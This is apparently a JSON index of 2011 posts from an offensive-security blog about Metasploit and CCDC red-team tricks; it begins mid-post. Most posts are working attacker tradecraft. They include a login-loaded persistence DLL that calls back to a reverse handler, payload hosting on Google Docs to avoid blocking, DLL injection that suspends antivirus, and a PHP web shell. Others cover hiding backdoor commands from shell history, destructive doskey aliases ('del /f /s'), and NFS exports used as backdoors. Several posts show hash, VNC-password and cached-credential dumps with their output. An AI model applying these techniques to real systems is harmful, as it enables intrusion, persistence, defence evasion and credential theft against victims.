present anything from awesome new ideas and pre-confrerence test-runs to the security settings on a mac. Accessible so that people could learn how to speak and get in front of people, and trusting enough so that people could do those pre-con / crazy idea talks and not worry that it’s going to get tweeted/blogged about. With that said Georgia is awesome enough to record the presentations of members who do wish to be recorded and posts them regularly to the interwebs here: http://www.grmn00bs.com/ you can also find them on the rarely updated NoVA Hackers Blog: http://novahackers.blogspot.com/ We now have 5-10 speakers every month (2nd Monday of the month unless moved for other reasons), we have pizza, beer, snacks and an awesome location (thanks to Lucas Lyon). Out next meeting is July 11th actually, so get invited quick! Are you in the NoVA / Maryland / DC area? Ask for an invite here: http://groups.google.com/group/novahackers or if you know someone in the group you can simple ask them to invite you. Just a word of warning, we do take the participation rule seriously, lurkers and non-participants are cut from the list. (Our definition of participation means asking questions (think instant access to industry experts), starting discussions, or responding to the questions on the mailing list, or showing up for meetings. But the best way and the easiest way to be able to slack a bit on the mailinglist or attendence side is to present. That is the main reason for the group/meetings) ","date":"2011-07-07","objectID":"https://malicious.link/posts/2011/2011-07-07-nova-hackers-3-years-old-and-still-going-strong/:0:0","tags":null,"title":"NoVA Hackers - 3 years old and still going strong","uri":"https://malicious.link/posts/2011/2011-07-07-nova-hackers-3-years-old-and-still-going-strong/"},{"categories":["persistence"],"content":"Nick Harbour wrote a post on Mandiants blog about some Malware that was using a dll called ‘fxsst.dll’ to hide and stay persistent on a system. The DLL is used by Windows when it is acting as a Fax server (anyone still do that?). He mentions some very interesting points: The DLL gets loaded at login by Explorer The DLL exists in System32 but is looked for in Windows first Explorer doesn’t try to use anything inside of it via exports unless the system is acting as a fax server (aka safe to put a pretty bland DLL there) I thought… no it couldn’t be that simple… lets see: We have our victim in a session and are going to make a DLL that points back to our reverse_https multi handler over port 443 Ok, we’ve got our super evil fxsst.dll now lets put it in place. Lets test it out just to make sure it works. I will use the PID of explorer.exe (cause thats where it’s going to be normally) and I’m going to use the method I talked about in the Remote DLL Injection post. Woot! Ok, so the DLL works, but does it load when a user logs in… (drop out of our 2 sessions first) Thats me logging in 2 times because I couldn’t believe that it worked. System was fine, and I had a shell. These tests were performed on XP. On Win7 x64 it make the systems freeze up. Right now the DLL payload generation in Metasploit for 64bit systems isn’t setup. So, stay away from doing this on x64 bit systems at least with the Metasploit DLL, since it’s run at login so you’ll have to use psexec or another session to actually remove the file while everyone is logged out. TEST PRIOR TO USE as always. ","date":"2011-06-27","objectID":"https://malicious.link/posts/2011/2011-06-27-fxsstdll-persistence-the-evil-fax-machine/:0:0","tags":null,"title":"fxsst.dll persistence: the evil fax machine","uri":"https://malicious.link/posts/2011/2011-06-27-fxsstdll-persistence-the-evil-fax-machine/"},{"categories":["metasploit","payloads"],"content":"In Part 1 I gave an example I used at CCDC with the single ‘windows/download_exec’. One of the down sides of that payload is you need to host the binary, giving up an IP/host that can be blocked. Well, Google recently (a couple months ago) allowed people to upload ‘anything’ to Google docs. And you can then share these files publicly. Probably already see where I’m going with this, but here are some steps to get it going, first upload your malicious binary (not the dropper ‘windows/download_exec’, but the file it needs to execute). I assume you don’t need a picture to find the upload button ;-) Next, go to Action -\u003e Share -\u003e Share and make it public: You’ll get a link that says docs.google.com / leaf?id= something: Go to that link and copy the link that says ‘Download’ You should have something like this: https://docs.google.com/uc?id=XXXXXXXX\u0026export=download\u0026hl=en_US Remove everything after the \u0026 and change https to http (download_exec can’t talk SSL) so you have something that looks like: http://docs.google.com/uc?id=XXXXXXXX Now use that link in the URL option when you generate your ‘windows/download_exec’ binary and you should be good to go. You can still change your binary on the fly by right clicking the file in your Google Docs list and selecting “Add or manage revisions”. Plus you get the added bonus of being virtually unblockable. One thing to be careful of is the download a ’leaf’ link are still live if you put the files in the ’trash’ on Google Docs, you need to empty the trash for them to be completely offline. Incident Responders, if you find something making these requests, switch the UC portion of the download back to ’leaf’ and you can find out when it was uploaded, and have the ability to “Report Abusive Content” which if that account continues to do ‘bad stuff’ it will get looked into by Google. ","date":"2011-06-26","objectID":"https://malicious.link/posts/2011/2011-06-26-metasploit-payloads-explained-part-1a/:0:0","tags":null,"title":"Metasploit Payloads Explained - Part 1a","uri":"https://malicious.link/posts/2011/2011-06-26-metasploit-payloads-explained-part-1a/"},{"categories":["metasploit","payloads"],"content":"Payload selection is something that rarely gets talked about in detail. Most PoCs just use calc.exe, netcat, or some kind of socket. The vast majority of Metasploit tutorials, videos and documentation use the windows/meterpreter/reverse_tcp payload which is only one of 224 possible payloads. Here is a little disclaimer: While the payloads in Metasploit don’t get updated as much as other parts of Metasploit, this is a point in time documentation of them (June 23, 2011) and the payloads available in Metasploit are constantly changing. I challenge you to continue to do a ‘show payloads’ and see what’s new. If you issue ‘show payloads’ at the base of Metasploit’s console (msf\u003e), it will show you every payload that Metasploit has available. However, exploit module writers can help the user out a bit with their selection by putting special limiters inside of their module. These limiters can be as specific as pointing out a specific payload, or as broad as specifying that it will only work with a ‘windows’ payload. For a decent example of this in action check out the JBoss ‘bshdeployer’ exploit module (modules/exploits/multi/http/jboss_bshdeployer.rb). The payloads Metasploit has are broken down into ‘staged’, ‘stagers’, and ‘**singles **(also known as Inline)’. The difference between ‘staged’ and ‘stagers’ is pretty simple, ‘staged’ payloads use tiny ‘stagers’ to be able to fit into small exploitation spaces. During exploitation the exploit developer often has a very limited amount of memory they can manipulate through the programs inputs that they are exploiting. The stagers go in this space and their only job is to pull down the rest of the ‘staged’ payload. The downside to these types of payloads is they require a connection to something that will shovel them the rest of the payload. Inline payloads or ‘singles’ don’t have this problem. They are self contained and do what they are designed to do without any assistance. All of the payloads in Metasploit use the one, the only, Multi Handler. I call it that because of how I call it: msf\u003e use multi/handler It is a fitting title though as it is equipped to handle every single payload inside of Metasploit no matter what the architecture or type of connection being made. It knows how to deal with each type of payload because you tell it what to expect, but that doesn’t take away from the fact that in this single utility lies the crucial stepping stone for all of Metasploit’s exploitation. The structure of most payloads tell you exactly what they do, but not always. If it says in the description that it’s ‘Inline’ that means it is a single, if it says ‘Stager’ that means it’s staged. Lets break a few down of the lesser known ones: cmd/windows/adduser - This is a single that executes ’net user /add’ with the username and password you specify. This one doesn’t say that it’s ‘Inline’ but all of the ‘cmd/’ or ‘/exec’ payloads are singles. osx/armle/vibrate - A single that when executed on an iPhone, it vibrates. generic/debug_trap - Trips a debugger if it’s attached to the process (sends a single xCC ‘break’ byte) One thing that isn’t immediately obvious is another marker of staged vs. singles: osx/ppc/shell/reverse_tcp osx/ppc/shell_reverse_tcp The difference between these two payloads isn’t obvious other than the fact that one has an underscore ‘_’ instead of a forward slash ‘/’. The one with the underscore means it’s a single while the other is staged. But the architecture of the naming convention is a bit complicated. Most stick to OS/ARCHITECTURE/TYPE/PAYLOAD where a slash instead of an underscore between TYPE and PAYLOAD would signify the difference we just talked about. But not all payloads stick to this format. You can even go crazy and actually look in the directory: msfdirectory/modules/payloads/ - everything in the singles directory.. hmmm yup, is a single. Singles are great for fire and forget, I’ve used as payloads for USB sticks (so the machine didn’t have to have a connection ","date":"2011-06-26","objectID":"https://malicious.link/posts/2011/2011-06-26-metasploit-payloads-explained-part-1/:0:0","tags":null,"title":"Metasploit Payloads Explained - Part 1","uri":"https://malicious.link/posts/2011/2011-06-26-metasploit-payloads-explained-part-1/"},{"categories":["metasploit","meterpreter"],"content":"Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well. Another way you can do this without the injection is just sending a suspend to all the threads in the process. pid = 2980 targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) targetprocess.thread.each_thread do |x| targetprocess.thread.open(x).suspend end We open the process just like we did before, and make a very simple ’each_thread’ loop. There are a few AVs engines that detected this as tampering. But if you target isn’t AV… Say it’s Process Explorer during CCDC, this might just confuse them enough to buy you some time to do other things without their watchful eye on you. The other cool thing that happened when I did this was Process Explorer didn’t detect the process as suspended. If you looked under the thread list they were all suspended but not the process itself according to Process Explorer. Not rocket science at all, but that’s because it’s built into the framework. Just another thing that metasploit makes dead simple. ","date":"2011-05-30","objectID":"https://malicious.link/posts/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/:0:0","tags":null,"title":"Remotely Suspend All Threads with Meterpreter","uri":"https://malicious.link/posts/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/"},{"categories":["dllinjection","metasploit","meterpreter","railgun"],"content":"Recently Didier Stevens wrote ‘Suspender.dll’ which is a DLL that will suspend a process and all of it’s child processes after a delay. 60 seconds is it’s default but you can rename the DLL to add a number (as such ‘Suspender10.dll’ for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: http://blog.didierstevens.com/2011/04/27/suspender-dll/ Jonathan Cran and I had the same idea, as I’m sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped. I still stand by my original claim that just removing it is easier (Blog Post: Silently Uninstall SEP). However that might be something the user notices (A little shield disappearing). Well, I didn’t know how to do this with meterpreter so a bit of google fu landed me on: http://www.codeproject.com/KB/threads/winspy.aspx which has 3 different ways to attack the 2nd of which used a DLL (score!) Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions) I start off setting up some variables after I’ve uploaded Suspender.dll: pid = 1436 sizeofsuspend = 52376 pathtosuspend = \"C:\\Docume~1\\Administrator\\Desktop\\Suspender10.dll\" Next up we need to open a handle on the target process: handle = client.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS,false,pid)[\"return\"] With the handle we allocate some memory in the remote process for our DLL to live in: allocatedmem = client.railgun.kernel32.VirtualAllocEx(handle,nil,sizeofsuspend,MEM_COMMIT,PAGE_READWRITE)[\"return\"] Writing that DLL to memory isn’t much harder: (this and the previous step is the wrong way to do things as we’ll see later) client.railgun.kernel32.WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,nil) Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn’t figure this one out, here is the best I did: client.railgun.kernel32.CreateRemoteThread(handle,nil,0,allocatedmem,pathtosuspend,0,nil) Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again: pid = 1436 pathtosuspend = \"C:\\Docume~1\\Administrator\\Desktop\\Suspender10.dll\" But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in r12765. We generate the payload with it pointing at our Suspender DLL: pay = client.framework.payloads.create(\"windows/loadlibrary\") pay.datastore['DLL'] = pathtosuspend pay.datastore['EXITFUNC'] = 'thread' raw = pay.generate Open the process, this time with Rex: targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) Allocate the memory in the remote process write the payload (not our DLL) into that space: mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024)) targetprocess.memory.write(mem, raw) And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun) targetprocess.thread.create(mem, 0) And 10 seconds later our AV and all it’s children processes stop. Suspended by Didier’s Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible. ","date":"2011-05-30","objectID":"https://malicious.link/posts/2011/2011-05-30-remote-dll-injection-with-meterpreter/:0:0","tags":null,"title":"Remote DLL Injection with Meterpreter","uri":"https://malicious.link/posts/2011/2011-05-30-remote-dll-injection-with-meterpreter/"},{"categories":["hashdump","metasploit","meterpreter","cracking"],"content":"When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the “The parameter is incorrect” error in meterpreter. So I’ve had to fall back on dropping binaries which I really don’t like doing because of the added clean up and chance of getting ‘caught’. Well, with a bit of migration you’ll be back to passing the hash. Here is how, with a bit of the thought process first: ## ### ## ## ## ## #### ###### #### ##### ##### ## #### ###### ####### ## ## ## ## ## ## ## ## ## ## ### ## ####### ###### ## ##### #### ## ## ## ## ## ## ## ## # ## ## ## ## ## ## ##### ## ## ## ## ## ## ## #### ### ##### ##### ## #### #### #### ### ## =[ metasploit v3.7.1-release [core:3.7 api:1.0] + -- --=[ 687 exploits - 364 auxiliary - 43 post + -- --=[ 217 payloads - 27 encoders - 8 nops =[ svn r12622 updated today (2011.05.15) msf \u003e [*] DC_IP:49220 Request received for /AYSBk... [*] DC_IP:49220 Staging connection for target YSBk received... [*] Patching Target ID YSBk into DLL [*] DC_IP:49221 Request received for /BYSBk... [*] DC_IP:49221 Stage connection for target YSBk received... [*] Meterpreter session 7 opened (ATTACKER_IP:443 -\u003e DC_IP:49221) at Sun May 15 21:37:31 +0000 2011 msf \u003e sessions -i 7 [*] Starting interaction with 7... meterpreter \u003e sysinfo System Language : en_US OS : Windows 2008 R2 (Build 7601, Service Pack 1). Computer : DOMAINCONTROLLE Architecture : x64 (Current Process is WOW64) Meterpreter : x86/win32 meterpreter \u003e ps Process list ============ PID Name Arch Session User Path --- ---- ---- ------- ---- ---- 0 [System Process] 4 System x64 0 224 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 324 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 364 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 372 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 404 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 468 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 476 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 484 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 628 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 708 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 804 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 836 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 880 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 932 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 972 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 328 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1172 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1204 Microsoft.ActiveDirectory.WebServices.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe 1252 dfsrs.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\dfsrs.exe 1288 dns.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\dns.exe 1316 ismserv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\ismserv.exe 1360 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1392 vmtoolsd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe 1464 wlms.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wlmswlms.exe 1492 dfssvc.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\dfssvc.exe 1572 VMUpgradeHelper.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\VMUpgradeHelper.exe 1896 TPAutoConnSvc.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\TPAutoConnSvc.exe 2016 vds.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\vds.exe 872 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\sppsvc.exe 1268 WmiPrvSE.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wbemWmiPrvSE.exe 2360 taskhost.exe x64 1","date":"2011-05-16","objectID":"https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/:0:0","tags":null,"title":"Dumping Hashes on Win2k8 R2 x64 with Metasploit","uri":"https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/"},{"categories":["internet"],"content":"Original Post: http://blog.nvisiumsecurity.com/2011/04/exploitable-mobile-app-challenge-now.html You can read the details on the above link, but it boils down to you make an application for iPhone or Android. You make it vulnerable to X,Y,Z types of flaws, you win a 32gb iPad or a Motorola Xoom. Added bonus, all the apps get submitted to OWASP for people to learn Mobile security. ","date":"2011-04-12","objectID":"https://malicious.link/posts/2011/2011-04-12-exploitable-mobile-app-challenge/:0:0","tags":null,"title":"Exploitable Mobile App Challenge","uri":"https://malicious.link/posts/2011/2011-04-12-exploitable-mobile-app-challenge/"},{"categories":["ipv6"],"content":"This is probably the most practical and applicable IPv6 talk I’ve ever seen. Amazing job. Rick Hayes - Assessing and Pen-Testing IPv6 Networks from Adrian Crenshaw on Vimeo. ","date":"2011-04-06","objectID":"https://malicious.link/posts/2011/2011-04-06-ipv6-attacks/:0:0","tags":null,"title":"IPv6 Attacks","uri":"https://malicious.link/posts/2011/2011-04-06-ipv6-attacks/"},{"categories":["appsec","apt","attackers","auroa","evilbadguys","fud"],"content":"I felt left out… That is all.. ","date":"2011-03-22","objectID":"https://malicious.link/posts/2011/2011-03-22-rsa-dun-got-hacked-apt-etc/:0:0","tags":null,"title":"RSA Dun-got hacked! APT etc..","uri":"https://malicious.link/posts/2011/2011-03-22-rsa-dun-got-hacked-apt-etc/"},{"categories":["vnc","meterpreter","scripting"],"content":"Chris Gates wrote a blog post about the ‘getvncpw’ meterpreter script. I ran into the same issue on Penetration Tests in the past but didn’t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn’t get a chance to. Yesterday I saw this ticket: https://www.metasploit.com/redmine/issues/3183 and thought to myself: “Thats definitely within my coding ability to contribute a patch for”. After almost 15 hours of coding between 9 pm on Saturday and 8 pm on Sunday. It went far and beyond just adding in a bit of code to support UltraVNC. changelog: Complete rewrite as a post module instead of a meterpreter script Passwords of less than 8 characters are correctly padded (thanks jduck) UltraVNC checks added TightVNC checks added for both VNC and it’s control console Made it very simple to add new checks in either the registry or in a file Output is a bit more verbose (lets you know something is happening Reports authentication credentials found to database Identifies the port that VNC is running on as well It isn’t in the metasploit trunk so until/if if gets added you can get it here: enum_vnc_pw.rb If you have a check, find it breaks for some reason or another, or just want to tell me that I suck, please leave a comment or email me. Here it is in action against my VM with 3 different VNC servers on it (calling the post module in two separate ways) : msf exploit(handler) \u003e sessions -i 1 [*] Starting interaction with 1... meterpreter \u003e getuid Server username: XPBASELINEAdministrator meterpreter \u003e background msf exploit(handler) \u003e use post/windows/gather/enum_vnc_pw msf post(enum_vnc_pw) \u003e set SESSION 1 SESSION =\u003e 1 msf post(enum_vnc_pw) \u003e show options Module options (post/windows/gather/enum_vnc_pw): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. msf post(enum_vnc_pw) \u003e run [*] Enumerating VNC passwords on XPBASELINE [*] Checking UltraVNC... [+] UltraVNC =\u003e A85B4C5976979DE93B =\u003e thisismy on port: 5900 [+] VIEW ONLY: UltraVNC =\u003e DE2C1BA7393F6708B3 =\u003e 111 on port: 5900 [*] Checking WinVNC3_HKLM... [*] Checking WinVNC3_HKCU... [*] Checking WinVNC3_HKLM_Default... [*] Checking WinVNC3_HKCU_Default... [*] Checking WinVNC_HKLM_Default... [*] Checking WinVNC_HKCU_Default... [*] Checking WinVNC4_HKLM... [+] WinVNC4_HKLM =\u003e c777b2de337a91cf =\u003e mypasswo on port: 5900 [*] Checking WinVNC4_HKCU... [*] Checking RealVNC_HKLM... [*] Checking RealVNC_HKCU... [*] Checking TightVNC_HKLM... [+] TightVNC_HKLM =\u003e 7ebf1e76f732459f =\u003e authpass on port: 5900 [*] Checking TightVNC_HKLM_Control_pass... [+] TightVNC_HKLM_Control_pass =\u003e f0299fd0e927cf2f =\u003e adminpas on port: 5900 [*] Post module execution completed msf post(enum_vnc_pw) \u003e sessions -i 1 [*] Starting interaction with 1... meterpreter \u003e run post/windows/gather/enum_vnc_pw [*] Enumerating VNC passwords on XPBASELINE [*] Checking UltraVNC... [+] UltraVNC =\u003e A85B4C5976979DE93B =\u003e thisismy on port: 5900 [+] VIEW ONLY: UltraVNC =\u003e DE2C1BA7393F6708B3 =\u003e 111 on port: 5900 [*] Checking WinVNC3_HKLM... [*] Checking WinVNC3_HKCU... [*] Checking WinVNC3_HKLM_Default... [*] Checking WinVNC3_HKCU_Default... [*] Checking WinVNC_HKLM_Default... [*] Checking WinVNC_HKCU_Default... [*] Checking WinVNC4_HKLM... [+] WinVNC4_HKLM =\u003e c777b2de337a91cf =\u003e mypasswo on port: 5900 [*] Checking WinVNC4_HKCU... [*] Checking RealVNC_HKLM... [*] Checking RealVNC_HKCU... [*] Checking TightVNC_HKLM... [+] TightVNC_HKLM =\u003e 7ebf1e76f732459f =\u003e authpass on port: 5900 [*] Checking TightVNC_HKLM_Control_pass... [+] TightVNC_HKLM_Control_pass =\u003e f0299fd0e927cf2f =\u003e adminpas on port: 5900 meterpreter \u003e ","date":"2011-03-21","objectID":"https://malicious.link/posts/2011/2011-03-21-metasploit-vnc-password-extraction/:0:0","tags":null,"title":"Metasploit VNC Password Extraction","uri":"https://malicious.link/posts/2011/2011-03-21-metasploit-vnc-password-extraction/"},{"categories":["ccdc","nircmd","cli"],"content":"One of the best ways to throw blue teamers off the scent of another host getting owned, which also has the added effect of stressing them out is a batch script that runs through some of the more annoying features in nircmd.exe in succession and at regular intervals: http://www.nirsoft.net/utils/nircmd.html setdisplay 640x480 killprocess taskmgr.exe killprocess procexp.exe win -style title “my computer” 0x00c00000 win child title “my computer” +exstyle all 0x00400000 win +exstyle title “my computer” 0x00400000 win trans ititle “internet explorer” 256 win close class “CabinetWClass” multiremote copy “c:tempcomputers.txt” exitwin poweroff force exitwin logoff standby monitor off win child class “Shell_TrayWnd” hide class “button” win hide class progman Just to name a few… another fun batch script to have running is ’echo knock knock | clip’ in an endless and delayless loop. (I makes ‘knock knock’ the only thing that will ever be pasted ;-) ","date":"2011-03-05","objectID":"https://malicious.link/posts/2011/2011-03-05-psychological-warfare-with-nircmd/:0:0","tags":null,"title":"Psychological Warfare with NirCMD","uri":"https://malicious.link/posts/2011/2011-03-05-psychological-warfare-with-nircmd/"},{"categories":["ccdc","webshell"],"content":"This is mostly for my memory for CCDC \u003c?php system($_GET['cmd']); ?\u003e I wonder what will happen if a RSS reader doesn’t do proper filtering… ","date":"2011-03-04","objectID":"https://malicious.link/posts/2011/2011-03-04-php-web-shell/:0:0","tags":null,"title":"PHP Web Shell","uri":"https://malicious.link/posts/2011/2011-03-04-php-web-shell/"},{"categories":["ccdc"],"content":"CORRECTION: Thanks to jduck for pointing it out, but you need to actually make a change to get this to work, reference: http://www.catonmat.net/blog/the-definitive-guide-to-bash-command-line-history/ and search for: Modifying History Behavior You simply put a space before it mubix@localhost:/tmp/demo$ ls -alh total 8.0K drwxr-xr-x 2 mubix mubix 4.0K Mar 1 19:43 . drwxrwxrwt 3 root root 4.0K Mar 1 19:43 .. -rw-r--r-- 1 mubix mubix 0 Mar 1 19:43 bob mubix@localhost:/tmp/demo$ cat ~/.bash_history ls -alh mubix@localhost:/tmp/demo$ mysecretlogin -u bobsuruncle -p allacazaam mubix@localhost:/tmp/demo$ cat ~/.bash_history ls -alh mubix@localhost:/tmp/demo$ Works well for backdoors you don’t want caught via the .bash_history as well ;-) More CCDC tricks as I think of them.. ","date":"2011-03-03","objectID":"https://malicious.link/posts/2011/2011-03-03-issue-a-linux-command-without-it-going-into-history/:0:0","tags":null,"title":"Issue a Linux command without it going into history","uri":"https://malicious.link/posts/2011/2011-03-03-issue-a-linux-command-without-it-going-into-history/"},{"categories":["ccdc","doskey"],"content":"Not sure how far back it goes (Win95?) but 2000, XP and all the way up to Win 7 have a program called DOSKEY: C:\\Users\\vmadmin\u003edoskey /? Edits command lines, recalls Windows commands, and creates macros. DOSKEY [/REINSTALL] [/LISTSIZE=size] [/MACROS[:ALL | :exename]] [/HISTORY] [/INSERT | /OVERSTRIKE] [/EXENAME=exename] [/MACROFILE=filename] [macroname=[text]] /REINSTALL Installs a new copy of Doskey. /LISTSIZE=size Sets size of command history buffer. /MACROS Displays all Doskey macros. /MACROS:ALL Displays all Doskey macros for all executables which have Doskey macros. /MACROS:exename Displays all Doskey macros for the given executable. /HISTORY Displays all commands stored in memory. /INSERT Specifies that new text you type is inserted in old text. /OVERSTRIKE Specifies that new text overwrites old text. /EXENAME=exename Specifies the executable. /MACROFILE=filename Specifies a file of macros to install. macroname Specifies a name for a macro you create. text Specifies commands you want to record. UP and DOWN ARROWS recall commands; ESC clears command line; F7 displays command history; ALT+F7 clears command history; F8 searches command history; F9 selects a command by number; ALT+F10 clears macro definitions. The following are some special codes in Doskey macro definitions: $T Command separator. Allows multiple commands in a macro. $1-$9 Batch parameters. Equivalent to %1-%9 in batch programs. $* Symbol replaced by everything following macro name on command line. Just like the Linux ‘alias’ command in some ways, you can remap pretty much any command you want. Here are some of the more evil ones I have used in the past: doskey cd=del /f /s $1 doskey tasklist=cat tasklist.txt doskey dir=dir …… I’m sure you can think of a ton more.. The great thing is that there isnt’ a /delete - you just have to know that in order to remove a doskey macro you just issue the command without the aliased part, so ‘doskey tasklist=’ will delete the tasklist macro. ","date":"2011-03-02","objectID":"https://malicious.link/posts/2011/2011-03-02-destructive-doskey-aliases/:0:0","tags":null,"title":"Destructive DOSKEY aliases","uri":"https://malicious.link/posts/2011/2011-03-02-destructive-doskey-aliases/"},{"categories":["ccdc","nfs"],"content":"Constant connections and odd binaries running on systems usually get caught pretty quickly in CCDC events. However, NFS exports are hardly ever noticed. Setting it up on an Ubuntu/Debian box is a snap and given the right directory and permissions can lead you right back to getting shell any time you want without a constant connection. Plus, NFS blends right in and can listen on TCP and/or UDP (2049) Here is a quick how-to on setting up NFS https://help.ubuntu.com/community/SettingUpNFSHowTo I’m sure you can think of much more evil locations but /etc/, /var/www/, and /root/ are some of my favorite exports, but there is no reason why you couldn’t just export ‘/’ that I know of. (NFSd might not permit it) Remember to change the NFS settings so that it runs as root and you are golden. ","date":"2011-03-01","objectID":"https://malicious.link/posts/2011/2011-03-01-creating-vulnerabilities-nfs-exports/:0:0","tags":null,"title":"Creating Vulnerabilities: NFS Exports","uri":"https://malicious.link/posts/2011/2011-03-01-creating-vulnerabilities-nfs-exports/"},{"categories":["windows"],"content":"(No I’m not old enough to have used that term when it was the standard) I believe that this tweet should be archived for reference: http://twitter.com/#!/_ming_se/status/37688231185219584 And for those who don’t get the reference, here is a Pontiac Fiero: ","date":"2011-02-16","objectID":"https://malicious.link/posts/2011/2011-02-16-metasploit-on-wintel-systems/:0:0","tags":null,"title":"Metasploit on Wintel Systems","uri":"https://malicious.link/posts/2011/2011-02-16-metasploit-on-wintel-systems/"},{"categories":["dns"],"content":"The following are good adds to your DNS brute force list: These are all SRV records so make sure your type is set correctly. The great thing about SRV records is that it tells you the port in the answer. Isn’t that nice of them? I don’t know of any DNS tools that utilize SRV as part of their process, but scripting dig to do so isn’t tough. _autodiscover._tcp _caldav._tcp _client._smtp _gc._tcp _h323cs._tcp _h323cs._udp _h323ls._tcp _h323ls._udp _h323rs._tcp _h323rs._tcp _http._tcp _iax.udp _imap._tcp _imaps._tcp _jabber-client._tcp _jabber._tcp _kerberos-adm._tcp _kerberos._tcp _kerberos._tcp.dc._msdcs _kerberos._udp _kpasswd._tcp _kpasswd._udp _ldap._tcp _ldap._tcp.dc._msdcs _ldap._tcp.gc._msdcs _ldap._tcp.pdc._msdcs _msdcs _mysqlsrv._tcp _ntp._udp _pop3._tcp _pop3s._tcp _sip._tcp _sip._tls _sip._udp _sipfederationtls._tcp _sipinternaltls._tcp _sips._tcp _smtp._tcp _stun._tcp _stun._udp _tcp _tls _udp _vlmcs._tcp _vlmcs._udp _wpad._tcp _xmpp-client._tcp _xmpp-server._tcp ","date":"2011-02-16","objectID":"https://malicious.link/posts/2011/2011-02-16-interesting-dns-stuff-srv-records/:0:0","tags":null,"title":"Interesting DNS Stuff - SRV Records","uri":"https://malicious.link/posts/2011/2011-02-16-interesting-dns-stuff-srv-records/"},{"categories":["meterpreter","cachedump"],"content":"Update: Cachedump has been added to the Metasploit trunk: https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946 Pull it down: wget http://lab.mediaservice.net/code/cachedump.rb put it here: /(metasploitdir)/modules/post/windows/gather Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM): meterpreter \u003e run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying 'XP' style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO.CO Effective Name : jdo Full Name : eJane Do User ID : 1107 Primary Group ID : 513 Additional groups : 33620069 33554432 34013184 Logon domain name : CONTOS ---------------------------------------------------------------------- [*] John the Ripper format: jdoe:592cdfbc3f1ef77ae95c75f851e37166:CONTOSO.CO:CONTOS [*] Hash are in MSCACHE format. (mscash) meterpreter \u003e 